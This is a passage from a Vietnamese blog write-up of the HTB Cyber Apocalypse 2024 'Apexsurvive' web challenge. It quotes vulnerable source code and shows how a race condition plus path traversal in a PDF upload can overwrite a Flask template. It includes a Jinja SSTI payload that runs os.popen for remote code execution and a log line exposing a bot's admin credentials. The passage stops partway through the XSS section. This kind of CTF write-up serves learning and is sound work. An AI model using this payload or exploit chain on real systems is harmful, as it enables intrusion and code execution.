<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Dạo này mình khá là hay viết wu các ctf challenge (chắc chắn không phải là do ngày trước mình lười), nó dường như đã tạo cho mình thói quen hàng tuần mình sẽ wu lại những challenge mình chơi và mình thấy hay và học được nhiều thứ từ nó. Câu lạc bộ mình tuần này có tham gia giải HTB - Cyber Apocalypse 2024, phải công nhận đây là một giải dài hơi và mình đã tốn tương đối thời gian cho các challenge web của giải này (cụ thể là 4 ngày) nhưng vẫn không thể solve được hết web challenge của giải, bản thân mình còn phải học hỏi rất nhiều nữa mới có thể hiểu và solve được dạng bài web cuối cùng nếu lần sau còn gặp lại. Giải đã kết thúc và cũng nhờ sự cố gắng, try hard của các anh em trong câu lạc bộ đến từ mọi mảng mà clb mình cũng đạt được thứ hạng mình nghĩ là khá cao , hehe. Lan man vậy cũng đủ rồi, sau đây sẽ là quá trình mình và các teamates trong KCSC đi giải các challenge web HTB, cũng như cách hiểu của mình về web chall đó. Let&rsquo;s go!!\n"><title>Cyber Apocalypse 2024 Write Up</title><link rel=canonical href=https://kev1n1203.github.io/p/htb-cyber-apocalypse-2024/><link rel=stylesheet href=/scss/style.min.43579eb5b8b82fae543c237cb1e0ed21184587621bafe6e42941bbb438644f4a.css><meta property='og:title' content="Cyber Apocalypse 2024 Write Up"><meta property='og:description' content="Dạo này mình khá là hay viết wu các ctf challenge (chắc chắn không phải là do ngày trước mình lười), nó dường như đã tạo cho mình thói quen hàng tuần mình sẽ wu lại những challenge mình chơi và mình thấy hay và học được nhiều thứ từ nó. Câu lạc bộ mình tuần này có tham gia giải HTB - Cyber Apocalypse 2024, phải công nhận đây là một giải dài hơi và mình đã tốn tương đối thời gian cho các challenge web của giải này (cụ thể là 4 ngày) nhưng vẫn không thể solve được hết web challenge của giải, bản thân mình còn phải học hỏi rất nhiều nữa mới có thể hiểu và solve được dạng bài web cuối cùng nếu lần sau còn gặp lại. Giải đã kết thúc và cũng nhờ sự cố gắng, try hard của các anh em trong câu lạc bộ đến từ mọi mảng mà clb mình cũng đạt được thứ hạng mình nghĩ là khá cao , hehe. Lan man vậy cũng đủ rồi, sau đây sẽ là quá trình mình và các teamates trong KCSC đi giải các challenge web HTB, cũng như cách hiểu của mình về web chall đó. Let&rsquo;s go!!\n"><meta property='og:url' content='https://kev1n1203.github.io/p/htb-cyber-apocalypse-2024/'><meta property='og:site_name' content="kev1n's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='CTF'><meta property='article:published_time' content='2024-03-15T10:31:07+00:00'><meta property='article:modified_time' content='2024-03-15T10:31:07+00:00'><meta name=twitter:title content="Cyber Apocalypse 2024 Write Up"><meta name=twitter:description content="Dạo này mình khá là hay viết wu các ctf challenge (chắc chắn không phải là do ngày trước mình lười), nó dường như đã tạo cho mình thói quen hàng tuần mình sẽ wu lại những challenge mình chơi và mình thấy hay và học được nhiều thứ từ nó. Câu lạc bộ mình tuần này có tham gia giải HTB - Cyber Apocalypse 2024, phải công nhận đây là một giải dài hơi và mình đã tốn tương đối thời gian cho các challenge web của giải này (cụ thể là 4 ngày) nhưng vẫn không thể solve được hết web challenge của giải, bản thân mình còn phải học hỏi rất nhiều nữa mới có thể hiểu và solve được dạng bài web cuối cùng nếu lần sau còn gặp lại. Giải đã kết thúc và cũng nhờ sự cố gắng, try hard của các anh em trong câu lạc bộ đến từ mọi mảng mà clb mình cũng đạt được thứ hạng mình nghĩ là khá cao , hehe. Lan man vậy cũng đủ rồi, sau đây sẽ là quá trình mình và các teamates trong KCSC đi giải các challenge web HTB, cũng như cách hiểu của mình về web chall đó. Let&rsquo;s go!!\n"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_80bb896afdf080a5.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>kev1n's Blog</a></h1><h2 class=site-description>Trung Hậu - Thành viên ăn hại tại KCSC</h2></div></header><ol class=menu-social><li><a href=https://github.com/kev1n1203 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://x.com/kev1n1203 target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#apexsurvive>Apexsurvive</a><ol><li><a href=#preface>Preface</a></li><li><a href=#verify-email-token>Verify email token</a></li><li><a href=#mò-mẫm-source-code>Mò mẫm source code</a></li><li><a href=#exploit-file-upload>Exploit file upload</a></li><li><a href=#bypass-sanitized-input-to-trigger-xss>Bypass sanitized input to trigger XSS</a></li><li><a href=#bypass-isinternal-with-race-condition>Bypass isInternal with race condition</a></li><li><a href=#complete-the-attack-chain--exploit>Complete the attack chain & Exploit</a></li><li><a href=#another-workaround-to-bypass-pdf-upload>Another workaround to bypass PDF upload</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/htb-cyber-apocalypse-2024/>Cyber Apocalypse 2024 Write Up</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2024-03-15T10:31:07Z>Mar 15, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>12 minute read</time></div></footer></div></header><section class=article-content><p>Dạo này mình khá là hay viết wu các ctf challenge (chắc chắn không phải là do ngày trước mình lười), nó dường như đã tạo cho mình thói quen hàng tuần mình sẽ wu lại những challenge mình chơi và mình thấy hay và học được nhiều thứ từ nó. Câu lạc bộ mình tuần này có tham gia giải HTB - Cyber Apocalypse 2024, phải công nhận đây là một giải dài hơi và mình đã tốn tương đối thời gian cho các challenge web của giải này (cụ thể là 4 ngày) nhưng vẫn không thể solve được hết web challenge của giải, bản thân mình còn phải học hỏi rất nhiều nữa mới có thể hiểu và solve được dạng bài web cuối cùng nếu lần sau còn gặp lại. Giải đã kết thúc và cũng nhờ sự cố gắng, try hard của các anh em trong câu lạc bộ đến từ mọi mảng mà clb mình cũng đạt được thứ hạng mình nghĩ là khá cao , hehe.
Lan man vậy cũng đủ rồi, sau đây sẽ là quá trình mình và các teamates trong KCSC đi giải các challenge web HTB, cũng như cách hiểu của mình về web chall đó. Let&rsquo;s go!!</p><h2 id=apexsurvive>Apexsurvive</h2><p><img src=https://hackmd.io/_uploads/BJWQ18b0p.png loading=lazy alt=image><br></p><h3 id=preface>Preface</h3><p>Đây là một chall white box nên mình download source về rồi dựng local khai thác cho nó tiện theo dõi, hehe :")))
Sau khi dựng xong thì mình cũng phải khá choáng vì dockerfile của bài này những 70 dòng, nên mình tò mò đọc để nắm trước cần phải làm gì ở chall này</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Setup flag
</span></span><span class=line><span class=cl>COPY flag.txt /root/flag
</span></span><span class=line><span class=cl>RUN chmod 600 /root/flag
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># Setup readflag
</span></span><span class=line><span class=cl>COPY config/readflag.c /
</span></span><span class=line><span class=cl>RUN gcc -o /readflag /readflag.c &amp;&amp; chmod 4755 /readflag &amp;&amp; rm /readflag.c
</span></span></code></pre></td></tr></table></div></div><p>Docker như này là mình phải RCE để lấy flag rùi
Chall có 2 service, 1 service web chính chạy python, và service email chạy js (và bot), nên mình nghĩ chắc sẽ có cả lỗ hổng client side và server side trong challenge này</p><h3 id=verify-email-token>Verify email token</h3><p>Vào chall thì mình được &lsquo;hướng dẫn&rsquo; đăng kí với tên <code>test@email.htb</code> và để nhận được token email verify, nên cũng nhanh nhảu register và nhận được token ở endpoint <code>/email</code> khi đã vào account settings và chọn verify:
<img src=https://hackmd.io/_uploads/HyQiJEmC6.png loading=lazy alt=image><br>Sau khi verify mình thấy có chức năng report và tham số truyền vào là ID của sản phẩm có tại <code>/challenge/home</code>(nghe mùi xss quá)
Đi vào đọc source, mình thấy có endpoint <code>/eternal</code> khá hay khi cho phép redirect đến endpoint mình control:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>@web.route(&#39;/external&#39;)
</span></span><span class=line><span class=cl>def external():
</span></span><span class=line><span class=cl>    url = request.args.get(&#39;url&#39;, &#39;&#39;)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    if not url:
</span></span><span class=line><span class=cl>        return redirect(&#39;/&#39;)
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    return redirect(url)
</span></span></code></pre></td></tr></table></div></div><p>Với việc cookie được set <strong>samesite: strict</strong>, mình nghĩ đến việc bypass Samesite Strict bằng redirect nên đã ngồi với thằng này cả buổi nhưng không có kết quả :cry:</p><h3 id=mò-mẫm-source-code>Mò mẫm source code</h3><p>Sau khi tốn kha khá thời gian với thằng endpoint này mà không được kết quả gì, mình quyết định tạm thời bỏ qua và hướng đến các chức năng khác, có 2 chức năng đáng chú ý khi mình có thể lên được admin, đó là thêm sản phẩm/addItem và thêm contract/addContract.</p><ul><li>Chức năng thêm sản phẩm có thể được sử dụng khi mình thỏa mãn <strong>isInternal</strong> (cụ thể là thuộc tính <strong>isInternal</strong> của user trong db là true) thì có thể sử dụng, addItem dùng để thêm một sản phẩm mới vào shop. Tuy nhiên thì các input cũng đã được sanitize chỉ cho phép nhập vào các tag và attribute nhất định được quy định trong <code>middlewares.py</code></li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>@api.route(&#39;/addItem&#39;, methods=[&#39;POST&#39;])
</span></span><span class=line><span class=cl>@isAuthenticated
</span></span><span class=line><span class=cl>@isVerified
</span></span><span class=line><span class=cl>@isInternal
</span></span><span class=line><span class=cl>@antiCSRF
</span></span><span class=line><span class=cl>@sanitizeInput
</span></span><span class=line><span class=cl>def addItem(decodedToken):
</span></span><span class=line><span class=cl>    name = request.form.get(&#39;name&#39;, &#39;&#39;)
</span></span><span class=line><span class=cl>    price = request.form.get(&#39;price&#39;, &#39;&#39;)
</span></span><span class=line><span class=cl>    description = request.form.get(&#39;description&#39;, &#39;&#39;)
</span></span><span class=line><span class=cl>    image = request.form.get(&#39;imageURL&#39;, &#39;&#39;)
</span></span><span class=line><span class=cl>    note = request.form.get(&#39;note&#39;, &#39;&#39;)
</span></span><span class=line><span class=cl>    seller = request.form.get(&#39;seller&#39;, &#39;&#39;)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    if any(value == &#39;&#39; for value in [name, price, description, image, note, seller]):
</span></span><span class=line><span class=cl>        return response(&#39;All fields are required!&#39;), 401
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    newProduct = addProduct(name, image, description, price, seller, note)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    if newProduct:
</span></span><span class=line><span class=cl>        return response(&#39;Product Added&#39;)
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    return response(&#39;Something went wrong!&#39;)
</span></span></code></pre></td></tr></table></div></div><ul><li>Chức năng mình muốn nói đến thêm contract, khi upload 1 file lên, server lưu nội dung vào <code>/tmp/temporaryUpload</code> rồi mới check nội dung của file đó ở hàm checkPDF sử dụng PdfReader mode strict (khó cứu ca này). Nếu check thành công sẽ nối <code>/app/application</code>, <code>contracts</code> và file name bằng <strong>os.path.join</strong> để tạo thành file path hoàn chỉnh. Hàm <strong>path.join</strong> dính path traversal nặng và đây là lỗi mình cần khai thác để exploit path traversal upload file to RCE.<br><img src=https://hackmd.io/_uploads/r1noqEQR6.png loading=lazy alt=image><br></li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=err>@</span><span class=n>api</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/addContract&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=err>@</span><span class=n>isAuthenticated</span>
</span></span><span class=line><span class=cl><span class=err>@</span><span class=n>isVerified</span>
</span></span><span class=line><span class=cl><span class=err>@</span><span class=n>isInternal</span>
</span></span><span class=line><span class=cl><span class=err>@</span><span class=n>isAdmin</span>
</span></span><span class=line><span class=cl><span class=err>@</span><span class=n>antiCSRF</span>
</span></span><span class=line><span class=cl><span class=err>@</span><span class=n>sanitizeInput</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>addContract</span><span class=p>(</span><span class=n>decodedToken</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>name</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;name&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>uploadedFile</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>files</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>uploadedFile</span> <span class=ow>or</span> <span class=ow>not</span> <span class=n>name</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>response</span><span class=p>(</span><span class=s1>&#39;All files required!&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>uploadedFile</span><span class=o>.</span><span class=n>filename</span> <span class=o>==</span> <span class=s1>&#39;&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>response</span><span class=p>(</span><span class=s1>&#39;Invalid file!&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>uploadedFile</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=s1>&#39;/tmp/temporaryUpload&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>isValidPDF</span> <span class=o>=</span> <span class=n>checkPDF</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>isValidPDF</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>filePath</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>current_app</span><span class=o>.</span><span class=n>root_path</span><span class=p>,</span> <span class=s1>&#39;contracts&#39;</span><span class=p>,</span> <span class=n>uploadedFile</span><span class=o>.</span><span class=n>filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>with</span> <span class=n>open</span><span class=p>(</span><span class=n>filePath</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=n>as</span> <span class=n>wf</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>with</span> <span class=n>open</span><span class=p>(</span><span class=s1>&#39;/tmp/temporaryUpload&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=n>as</span> <span class=n>fr</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>wf</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>fr</span><span class=o>.</span><span class=n>read</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>response</span><span class=p>(</span><span class=s1>&#39;Contract Added&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>except</span> <span class=n>Exception</span> <span class=n>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>e</span><span class=p>,</span> <span class=n>file</span><span class=o>=</span><span class=n>sys</span><span class=o>.</span><span class=n>stdout</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>response</span><span class=p>(</span><span class=s1>&#39;Something went wrong!&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>response</span><span class=p>(</span><span class=s1>&#39;Invalid PDF! what are you trying to do?&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>Buồn ở chỗ chức năng này không dễ có tí nào vì phải là admin thì mới sử dụng được, bài toán lúc này lại quay về việc làm thế nào để lên được admin</li></ul><p>Tiếp tục đọc source, mình ngốn khoảng 1 buổi tiếp theo để nghĩ cách bypass admin nhưng chẳng có cách nào khả thi, cũng may là cuộc thi kéo dài nhiều ngày nên mình có nhiều thời gian suy nghĩ hơn. Lúc này mình đã chịu và không tìm được cách leo lên admin, nhưng lại biết được vuln sau khi lên admin (aizzz chíc tịc). Nhận thấy chức năng report sẽ lấy credential của admin và gửi đi nên mình sử dụng chúng đăng nhập vào admin exploit lỗi upload file, các teammates sẽ lo vụ leo lên admin :laughing:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>2024-03-16 22:34:49 127.0.0.1 - - [16/Mar/2024 15:34:49] &#34;GET /visit?productID=1&amp;email=xclow3n@apexsurvive.htb&amp;password=d8Bfk5Fw6oiROrxqrS2TmLc4NF1ZHU3r0OQfZSzbHna2DGljQbEmNG6st7uZ9QQ7 HTTP/1.1&#34; 200 -
</span></span></code></pre></td></tr></table></div></div><h3 id=exploit-file-upload>Exploit file upload</h3><p>Nói đến upload file python thì cách đầu tiên mình nghĩ đến là upload ghi đè file <code>__init__.py</code> nhưng web này lại không có nên hướng đi đó không khả thi cho lắm :cry:
Vì mới gần đây có một bài upload python cũng na ná, teammate <a class=link href=https://hackmd.io/@machongnam target=_blank rel=noopener>MacHongNam</a> đã gợi ý mình cách ghi đè file html và ssti trong file đó để khi server render_template sẽ trigger ssti để RCE. Điều kiện là file templates đó chưa được render lần nào, vì render_template sẽ ghi nhớ các lần render nên nếu render lỗi khả năng phải chạy lại docker làm lại là rất cao
Mình sẽ chọn templates <code>info.html</code> được render ở path <code>/</code> để inject -> trang chủ giới thiệu, chỉ cần lúc đầu mình truy cập thẳng vào path <code>/challenge</code> và <code>/email</code> là được</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>@challengeInfo.route(&#39;/&#39;)
</span></span><span class=line><span class=cl>def info():
</span></span><span class=line><span class=cl>    return render_template(&#39;info.html&#39;)
</span></span></code></pre></td></tr></table></div></div><p>File sau khi được upload sẽ <strong>lưu</strong> vào <code>/tmp/temporaryUpload</code> rồi mới được check, sau khi check thành công nội dung được đưa vào folder contracts hoặc là trả về thông báo invalid PDF.
=> Phải mất 2 lần ghi file thì file mới được ghi thành công, mình hoàn toàn có thể lợi dụng lúc file pdf đang được check để upload 1 file html nữa thế chỗ file pdf cũ => <strong>race condition</strong>, sau đó sử dụng path traversal ghi đè html là có thể rce thành công rồi
Mình bắt tay vào viết script upload file race condition nhưng bằng một lý do gì đấy mà script của mình đều ghi đè pdf vào templates thay vì file html mà mình mong muốn =))). Mình stuck ở đây cũng phải 2 tiếng trước khi quyết định méo dùng script python nữa mà chuyển qua xài Burp Repeater cho nó nhanh.
Server check pdf chặt nên mình sẽ gửi 1 pdf valid lấy mẫu request, và file html mình copy nguyên từ thằng gốc và nhét thêm dòng:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{% print(namespace.__init__.__globals__.os.popen(&#39;/readflag&#39;).read()) %}
</span></span></code></pre></td></tr></table></div></div><p>Thay đổi tên file của các file html thành <code>/app/application/templates/info.html</code>, mình gửi đi cùng lúc 1 req upload pdf và 6 req upload html
<img src=https://hackmd.io/_uploads/BJIR-rXRp.png loading=lazy alt=image><br>Sau một hồi spam Ctrl Space thì mình đã ghi đè được file info.html
<img src=https://hackmd.io/_uploads/SyOQfBmCp.png loading=lazy alt=image><br>Khai thác thành công!!
<img src=https://hackmd.io/_uploads/SJwvMBmAa.png loading=lazy alt=image><br></p><p>Tuy rằng đã có thể khai thác thành công, nhưng mình vẫn chưa tìm được cách nào để có thể lên được admin, cùng lúc này teammate <a class=link href=https://hackmd.io/@machongnam target=_blank rel=noopener>MacHongNam</a> bảo mình hãy nghĩ cách để lên được <strong>isInternal</strong> nhằm sử dụng api /addItem, vì mình có thể dom based XSS tại endpoint /product/product-id</p><h3 id=bypass-sanitized-input-to-trigger-xss>Bypass sanitized input to trigger XSS</h3><p>Nghe như vậy thì mình đã tìm đến path addProduct để thêm sản phẩm, khi đọc đến <code>product.html</code> thì mình đã thấy vì sao có thể dom based XSS:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
